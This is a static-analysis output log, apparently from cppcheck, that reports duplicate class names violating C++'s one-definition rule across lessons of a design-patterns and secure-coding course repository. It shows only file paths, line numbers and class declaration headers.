D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:441:1: error: The one definition rule is violated, different classes/structs have the same name 'NotificationService' [ctuOneDefinitionRuleViolation]
class NotificationService {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp:313:1: note: The one definition rule is violated, different classes/structs have the same name 'NotificationService'
class NotificationService {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:441:1: note: The one definition rule is violated, different classes/structs have the same name 'NotificationService'
class NotificationService {
^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_kiss_yagni_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerabledry_kiss_yagni' [ctuOneDefinitionRuleViolation]
class Vulnerabledry_kiss_yagni {
^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\exploits\dry_kiss_yagni_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerabledry_kiss_yagni'
class Vulnerabledry_kiss_yagni {
^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_kiss_yagni_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerabledry_kiss_yagni'
class Vulnerabledry_kiss_yagni {
^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:528:1: error: The one definition rule is violated, different classes/structs have the same name 'GoodConfig' [ctuOneDefinitionRuleViolation]
class GoodConfig {
^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:240:1: note: The one definition rule is violated, different classes/structs have the same name 'GoodConfig'
class GoodConfig {
^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:528:1: note: The one definition rule is violated, different classes/structs have the same name 'GoodConfig'
class GoodConfig {
^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:612:1: error: The one definition rule is violated, different classes/structs have the same name 'SimpleCache < std :: string , std :: string >' [ctuOneDefinitionRuleViolation]
class SimpleCache {
^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:474:1: note: The one definition rule is violated, different classes/structs have the same name 'SimpleCache < std :: string , std :: string >'
class SimpleCache {
^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:612:1: note: The one definition rule is violated, different classes/structs have the same name 'SimpleCache < std :: string , std :: string >'
class SimpleCache {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:121:1: error: The one definition rule is violated, different classes/structs have the same name 'CreditCardPayment' [ctuOneDefinitionRuleViolation]
class CreditCardPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:347:1: note: The one definition rule is violated, different classes/structs have the same name 'CreditCardPayment'
class CreditCardPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:121:1: note: The one definition rule is violated, different classes/structs have the same name 'CreditCardPayment'
class CreditCardPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:181:1: error: The one definition rule is violated, different classes/structs have the same name 'PayPalPayment' [ctuOneDefinitionRuleViolation]
class PayPalPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:366:1: note: The one definition rule is violated, different classes/structs have the same name 'PayPalPayment'
class PayPalPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:181:1: note: The one definition rule is violated, different classes/structs have the same name 'PayPalPayment'
class PayPalPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:240:1: error: The one definition rule is violated, different classes/structs have the same name 'BankTransferPayment' [ctuOneDefinitionRuleViolation]
class BankTransferPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:383:1: note: The one definition rule is violated, different classes/structs have the same name 'BankTransferPayment'
class BankTransferPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:240:1: note: The one definition rule is violated, different classes/structs have the same name 'BankTransferPayment'
class BankTransferPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:421:1: error: The one definition rule is violated, different classes/structs have the same name 'PaymentProcessor' [ctuOneDefinitionRuleViolation]
class PaymentProcessor {
^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:400:1: note: The one definition rule is violated, different classes/structs have the same name 'PaymentProcessor'
class PaymentProcessor {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:421:1: note: The one definition rule is violated, different classes/structs have the same name 'PaymentProcessor'
class PaymentProcessor {
^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_inheritance_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecomposition_inheritance' [ctuOneDefinitionRuleViolation]
class Vulnerablecomposition_inheritance {
^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\exploits\composition_inheritance_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecomposition_inheritance'
class Vulnerablecomposition_inheritance {
^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_inheritance_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecomposition_inheritance'
class Vulnerablecomposition_inheritance {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:39:1: error: The one definition rule is violated, different classes/structs have the same name 'BadRectangle' [ctuOneDefinitionRuleViolation]
class BadRectangle {
^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:228:1: note: The one definition rule is violated, different classes/structs have the same name 'BadRectangle'
class BadRectangle {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:39:1: note: The one definition rule is violated, different classes/structs have the same name 'BadRectangle'
class BadRectangle {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:73:1: error: The one definition rule is violated, different classes/structs have the same name 'BadSquare' [ctuOneDefinitionRuleViolation]
class BadSquare : public BadRectangle {
^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:261:1: note: The one definition rule is violated, different classes/structs have the same name 'BadSquare'
class BadSquare : public BadRectangle {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:73:1: note: The one definition rule is violated, different classes/structs have the same name 'BadSquare'
class BadSquare : public BadRectangle {
^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:522:1: error: The one definition rule is violated, different classes/structs have the same name 'BadLogger' [ctuOneDefinitionRuleViolation]
class BadLogger {
^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:74:1: note: The one definition rule is violated, different classes/structs have the same name 'BadLogger'
class BadLogger {
^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:522:1: note: The one definition rule is violated, different classes/structs have the same name 'BadLogger'
class BadLogger {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:135:1: error: The one definition rule is violated, different classes/structs have the same name 'EmailService' [ctuOneDefinitionRuleViolation]
class EmailService {
^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:174:1: note: The one definition rule is violated, different classes/structs have the same name 'EmailService'
class EmailService : public IEmailService {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:135:1: note: The one definition rule is violated, different classes/structs have the same name 'EmailService'
class EmailService {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:148:1: error: The one definition rule is violated, different classes/structs have the same name 'Logger' [ctuOneDefinitionRuleViolation]
class Logger {
^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\di_basics.cpp:242:1: note: The one definition rule is violated, different classes/structs have the same name 'Logger'
class Logger : public ILogger {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:148:1: note: The one definition rule is violated, different classes/structs have the same name 'Logger'
class Logger {
^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\dependency_injection_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerabledependency_injection' [ctuOneDefinitionRuleViolation]
class Vulnerabledependency_injection {
^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\exploits\dependency_injection_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerabledependency_injection'
class Vulnerabledependency_injection {
^
D:\Work\Patterns\02-principles\lesson_2_4_dependency_injection\dependency_injection_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerabledependency_injection'
class Vulnerabledependency_injection {
^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:30:1: error: The one definition rule is violated, different classes/structs have the same name 'VulnerableAbstractFactory' [ctuOneDefinitionRuleViolation]
class VulnerableAbstractFactory {
^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableAbstractFactory'
class VulnerableAbstractFactory {
^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:30:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableAbstractFactory'
class VulnerableAbstractFactory {
^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:165:1: error: The one definition rule is violated, different classes/structs have the same name 'UseAfterFreeAbstractFactory' [ctuOneDefinitionRuleViolation]
class UseAfterFreeAbstractFactory {
^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:166:1: note: The one definition rule is violated, different classes/structs have the same name 'UseAfterFreeAbstractFactory'
class UseAfterFreeAbstractFactory {
^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:165:1: note: The one definition rule is violated, different classes/structs have the same name 'UseAfterFreeAbstractFactory'
class UseAfterFreeAbstractFactory {
^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'VulnerableAdapter' [ctuOneDefinitionRuleViolation]
class VulnerableAdapter {
^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\exploits\adapter_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableAdapter'
class VulnerableAdapter {
^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableAdapter'
class VulnerableAdapter {
^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_vulnerabilities.cpp:115:1: error: The one definition rule is violated, different classes/structs have the same name 'UseAfterFreeAdapter' [ctuOneDefinitionRuleViolation]
class UseAfterFreeAdapter {
^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\exploits\adapter_exploits.cpp:173:1: note: The one definition rule is violated, different classes/structs have the same name 'UseAfterFreeAdapter'
class UseAfterFreeAdapter {
^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_vulnerabilities.cpp:115:1: note: The one definition rule is violated, different classes/structs have the same name 'UseAfterFreeAdapter'
class UseAfterFreeAdapter {
^
D:\Work\Patterns\04-structural\lesson_4_2_decorator\decorator_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'VulnerableDecorator' [ctuOneDefinitionRuleViolation]
class VulnerableDecorator {
^
D:\Work\Patterns\04-structural\lesson_4_2_decorator\exploits\decorator_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableDecorator'
class VulnerableDecorator {
^
D:\Work\Patterns\04-structural\lesson_4_2_decorator\decorator_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableDecorator'
class VulnerableDecorator {
^
D:\Work\Patterns\04-structural\lesson_4_3_facade\exploits\facade_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'VulnerableFacade' [ctuOneDefinitionRuleViolation]
class VulnerableFacade {
^
D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableFacade'
class VulnerableFacade {
^
D:\Work\Patterns\04-structural\lesson_4_3_facade\exploits\facade_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableFacade'
class VulnerableFacade {
^
D:\Work\Patterns\04-structural\lesson_4_4_proxy\exploits\proxy_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'VulnerableProxy' [ctuOneDefinitionRuleViolation]
class VulnerableProxy {
^
D:\Work\Patterns\04-structural\lesson_4_4_proxy\proxy_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableProxy'
class VulnerableProxy {
^
D:\Work\Patterns\04-structural\lesson_4_4_proxy\exploits\proxy_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableProxy'
class VulnerableProxy {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:30:1: error: The one definition rule is violated, different classes/structs have the same name 'VulnerableSubject' [ctuOneDefinitionRuleViolation]
class VulnerableSubject {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_vulnerabilities.cpp:30:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableSubject'
class VulnerableSubject {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:30:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableSubject'
class VulnerableSubject {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:125:1: error: The one definition rule is violated, different classes/structs have the same name 'UnsafeSubject' [ctuOneDefinitionRuleViolation]
class UnsafeSubject {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_vulnerabilities.cpp:92:1: note: The one definition rule is violated, different classes/structs have the same name 'UnsafeSubject'
class UnsafeSubject {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:125:1: note: The one definition rule is violated, different classes/structs have the same name 'UnsafeSubject'
class UnsafeSubject {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:269:1: error: The one definition rule is violated, different classes/structs have the same name 'LeakySubject' [ctuOneDefinitionRuleViolation]
class LeakySubject {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_vulnerabilities.cpp:149:1: note: The one definition rule is violated, different classes/structs have the same name 'LeakySubject'
class LeakySubject {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:269:1: note: The one definition rule is violated, different classes/structs have the same name 'LeakySubject'
class LeakySubject {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_pattern.cpp:279:1: error: The one definition rule is violated, different classes/structs have the same name 'ThreadSafeSubject' [ctuOneDefinitionRuleViolation]
class ThreadSafeSubject {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\secure_observer_alternatives.cpp:294:1: note: The one definition rule is violated, different classes/structs have the same name 'ThreadSafeSubject'
class ThreadSafeSubject {
^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\observer_pattern.cpp:279:1: note: The one definition rule is violated, different classes/structs have the same name 'ThreadSafeSubject'
class ThreadSafeSubject {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp:248:1: error: The one definition rule is violated, different classes/structs have the same name 'PriceCalculator' [ctuOneDefinitionRuleViolation]
class PriceCalculator {
^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_pattern.cpp:345:1: note: The one definition rule is violated, different classes/structs have the same name 'PriceCalculator'
class PriceCalculator {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp:248:1: note: The one definition rule is violated, different classes/structs have the same name 'PriceCalculator'
class PriceCalculator {
^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_cpp23_comparison.cpp:21:1: error: The one definition rule is violated, different classes/structs have the same name 'AddStrategy' [ctuOneDefinitionRuleViolation]
class AddStrategy : public Strategy { public: int execute(int x) override { return x + 10; } };
^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_pattern.cpp:428:1: note: The one definition rule is violated, different classes/structs have the same name 'AddStrategy'
struct AddStrategy {
^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_cpp23_comparison.cpp:21:1: note: The one definition rule is violated, different classes/structs have the same name 'AddStrategy'
class AddStrategy : public Strategy { public: int execute(int x) override { return x + 10; } };
^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\exploits\strategy_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablestrategy' [ctuOneDefinitionRuleViolation]
class Vulnerablestrategy {
^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablestrategy'
class Vulnerablestrategy {
^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\exploits\strategy_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablestrategy'
class Vulnerablestrategy {
^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\game_strategies.cpp:319:1: error: The one definition rule is violated, different classes/structs have the same name 'GameObject' [ctuOneDefinitionRuleViolation]
class GameObject {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:373:1: note: The one definition rule is violated, different classes/structs have the same name 'GameObject'
class GameObject {
^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\game_strategies.cpp:319:1: note: The one definition rule is violated, different classes/structs have the same name 'GameObject'
class GameObject {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:89:1: error: The one definition rule is violated, different classes/structs have the same name 'User' [ctuOneDefinitionRuleViolation]
class User {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_vulnerabilities.cpp:85:1: note: The one definition rule is violated, different classes/structs have the same name 'User'
class User {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:89:1: note: The one definition rule is violated, different classes/structs have the same name 'User'
class User {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:245:1: error: The one definition rule is violated, different classes/structs have the same name 'MacroCommand' [ctuOneDefinitionRuleViolation]
class MacroCommand : public Command {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_vulnerabilities.cpp:388:1: note: The one definition rule is violated, different classes/structs have the same name 'MacroCommand'
class MacroCommand : public ICommand {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:245:1: note: The one definition rule is violated, different classes/structs have the same name 'MacroCommand'
class MacroCommand : public Command {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:89:1: error: The one definition rule is violated, different classes/structs have the same name 'User' [ctuOneDefinitionRuleViolation]
class User {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\exploits\command_exploits.cpp:82:1: note: The one definition rule is violated, different classes/structs have the same name 'User'
struct User {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:89:1: note: The one definition rule is violated, different classes/structs have the same name 'User'
class User {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:245:1: error: The one definition rule is violated, different classes/structs have the same name 'MacroCommand' [ctuOneDefinitionRuleViolation]
class MacroCommand : public Command {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\exploits\command_exploits.cpp:376:1: note: The one definition rule is violated, different classes/structs have the same name 'MacroCommand'
class MacroCommand : public VulnerableCommand {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:245:1: note: The one definition rule is violated, different classes/structs have the same name 'MacroCommand'
class MacroCommand : public Command {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_vulnerabilities.cpp:94:1: error: The one definition rule is violated, different classes/structs have the same name 'PrivilegedCommand' [ctuOneDefinitionRuleViolation]
class PrivilegedCommand : public ICommand {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\secure_command_alternatives.cpp:145:1: note: The one definition rule is violated, different classes/structs have the same name 'PrivilegedCommand'
class PrivilegedCommand : public ICommand {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_vulnerabilities.cpp:94:1: note: The one definition rule is violated, different classes/structs have the same name 'PrivilegedCommand'
class PrivilegedCommand : public ICommand {
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:166:1: error: The one definition rule is violated, different classes/structs have the same name 'StateA' [ctuOneDefinitionRuleViolation]
class StateA : public StateObject {
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_cpp23_comparison.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'StateA'
class StateA : public State { public: void handle() override { std::cout << "State A\n"; } };
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:166:1: note: The one definition rule is violated, different classes/structs have the same name 'StateA'
class StateA : public StateObject {
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:173:1: error: The one definition rule is violated, different classes/structs have the same name 'StateB' [ctuOneDefinitionRuleViolation]
class StateB : public StateObject {
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_cpp23_comparison.cpp:21:1: note: The one definition rule is violated, different classes/structs have the same name 'StateB'
class StateB : public State { public: void handle() override { std::cout << "State B\n"; } };
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:173:1: note: The one definition rule is violated, different classes/structs have the same name 'StateB'
class StateB : public StateObject {
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:166:1: error: The one definition rule is violated, different classes/structs have the same name 'StateA' [ctuOneDefinitionRuleViolation]
class StateA : public StateObject {
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:372:1: note: The one definition rule is violated, different classes/structs have the same name 'StateA'
class StateA : public LeakyState {
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:166:1: note: The one definition rule is violated, different classes/structs have the same name 'StateA'
class StateA : public StateObject {
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:173:1: error: The one definition rule is violated, different classes/structs have the same name 'StateB' [ctuOneDefinitionRuleViolation]
class StateB : public StateObject {
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:390:1: note: The one definition rule is violated, different classes/structs have the same name 'StateB'
class StateB : public LeakyState {
^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:173:1: note: The one definition rule is violated, different classes/structs have the same name 'StateB'
class StateB : public StateObject {
^
D:\Work\Patterns\01-basics\lesson_1_3_smart_pointers\exploits\smart_pointers_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesmart_pointers' [ctuOneDefinitionRuleViolation]
class Vulnerablesmart_pointers {
^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\smart_pointers_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesmart_pointers'
class Vulnerablesmart_pointers {
^
D:\Work\Patterns\01-basics\lesson_1_3_smart_pointers\exploits\smart_pointers_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesmart_pointers'
class Vulnerablesmart_pointers {
^
D:\Work\Patterns\01-basics\lesson_1_4_move_semantics\exploits\move_semantics_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablemove_semantics' [ctuOneDefinitionRuleViolation]
class Vulnerablemove_semantics {
^
D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\move_semantics_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablemove_semantics'
class Vulnerablemove_semantics {
^
D:\Work\Patterns\01-basics\lesson_1_4_move_semantics\exploits\move_semantics_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablemove_semantics'
class Vulnerablemove_semantics {
^
D:\Work\Patterns\06-modern-cpp\lesson_6_3_crtp\crtp_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecrtp' [ctuOneDefinitionRuleViolation]
class Vulnerablecrtp {
^
D:\Work\Patterns\06-modern-cpp\lesson_6_3_crtp\exploits\crtp_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecrtp'
class Vulnerablecrtp {
^
D:\Work\Patterns\06-modern-cpp\lesson_6_3_crtp\crtp_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecrtp'
class Vulnerablecrtp {
^
D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\exploits\type_erasure_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerabletype_erasure' [ctuOneDefinitionRuleViolation]
class Vulnerabletype_erasure {
^
D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\type_erasure_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerabletype_erasure'
class Vulnerabletype_erasure {
^
D:\Work\Patterns\06-modern-cpp\lesson_6_4_type_erasure\exploits\type_erasure_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerabletype_erasure'
class Vulnerabletype_erasure {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\exploits\command_exploits.cpp:112:1: error: The one definition rule is violated, different classes/structs have the same name 'VulnerableExecutor' [ctuOneDefinitionRuleViolation]
class VulnerableExecutor {
^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\exploits\producer_consumer_exploits.cpp:49:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableExecutor'
class VulnerableExecutor {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\exploits\command_exploits.cpp:112:1: note: The one definition rule is violated, different classes/structs have the same name 'VulnerableExecutor'
class VulnerableExecutor {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Message' [ctuOneDefinitionRuleViolation]
class Message {
^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_vulnerabilities.cpp:231:1: note: The one definition rule is violated, different classes/structs have the same name 'Message'
struct Message {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Message'
class Message {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Message' [ctuOneDefinitionRuleViolation]
class Message {
^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\secure_producer_consumer_alternatives.cpp:254:1: note: The one definition rule is violated, different classes/structs have the same name 'Message'
struct Message {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Message'
class Message {
^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\exploits\producer_consumer_exploits.cpp:23:1: error: The one definition rule is violated, different classes/structs have the same name 'Task' [ctuOneDefinitionRuleViolation]
struct Task {
^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\async_thread_pool.cpp:35:1: note: The one definition rule is violated, different classes/structs have the same name 'Task'
struct Task {
^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\exploits\producer_consumer_exploits.cpp:23:1: note: The one definition rule is violated, different classes/structs have the same name 'Task'
struct Task {
^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\exploits\thread_pool_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablethread_pool' [ctuOneDefinitionRuleViolation]
class Vulnerablethread_pool {
^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablethread_pool'
class Vulnerablethread_pool {
^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\exploits\thread_pool_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablethread_pool'
class Vulnerablethread_pool {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Message' [ctuOneDefinitionRuleViolation]
class Message {
^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_cpp23_comparison.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Message'
struct Message { int id; std::string data; };
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Message'
class Message {
^
